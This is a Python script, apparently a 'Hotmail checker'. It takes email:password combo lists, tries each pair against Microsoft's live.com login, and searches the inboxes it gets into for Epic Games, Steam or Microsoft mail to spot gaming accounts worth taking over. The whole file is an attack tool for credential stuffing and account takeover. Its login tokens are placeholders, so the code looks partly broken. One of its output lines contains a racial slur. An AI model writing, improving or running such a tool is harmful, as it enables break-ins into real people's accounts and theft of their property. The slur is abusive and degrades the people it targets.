import re
import requests
import tkinter as tk
from tkinter import filedialog

def check_hotmail(email, password):
    url = f"https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1562407980&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d99c3e658-5b8b-4e4b-a9f9-f39e2f848899&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    data = {
        "login": email,
        "passwd": password,
        "PPFT": "ppft_value",
        "PPLM": "pplm_value",
        "PPRM": "pprm_value",
        "PPLID": "pplid_value",
        "SI": "Sign in",
    }

    response = requests.post(url, headers=headers, data=data)
    
    if "Sign in" not in response.text:
        return True
    else:
        return False

def check_emails(email, password):
    session = requests.Session()
    
    login_url = "https://login.live.com/login.srf"
    inbox_url = "https://outlook.live.com/mail/0/inbox"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    }
    
    data = {
        "login": email,
        "passwd": password,
        "PPFT": "ppft_value",
        "PPLM": "pplm_value",
        "PPRM": "pprm_value",
        "PPLID": "pplid_value",
        "SI": "Sign in",
    }

    response = session.post(login_url, headers=headers, data=data)
    
    if "Sign in" not in response.text:
        response = session.get(inbox_url)
        
        epic_games_email = re.search(r"epicgames\.com", response.text)
        steam_email = re.search(r"steam\.com", response.text)
        microsoft_email = re.search(r"microsoft\.com", response.text)
        
        if epic_games_email:
            print(f"Epic Games email found for {email}: {epic_games_email.group()}")
            print("---EpicGames was found!")
        elif steam_email:
            print(f"Steam email found for {email}: {steam_email.group()}")
            print("---Steam was found!")
        elif microsoft_email:
            print(f"Microsoft email found for {email}: {microsoft_email.group()}")
            print("---Microsoft was found!")
        else:
            print(f"No Epic Games, Steam, or Microsoft email found for {email}")
    else:
        print(f"Failed to log in to {email}")

def check_file(filename):
    with open(filename, 'r') as file:
        for line in file:
            email, password = line.strip().split(':')
            
            if check_hotmail(email, password):
                print(f"Valid: {email}:{password}")
                check_emails(email, password)
            else:
                print(f"Invalid: {email}")
    print("Done checking!")
    print("Here's my GitHub, nigger: https://github.com/takost")

def main():
    root = tk.Tk()
    root.withdraw() # hide the main window
    
    filename = filedialog.askopenfilename(
        title="skibidi github open source: https://github.com/takostX",
        filetypes=[("Text files", "*.txt")]
    )
    
    if filename:
        check_file(filename)

if __name__ == "__main__":
    main() 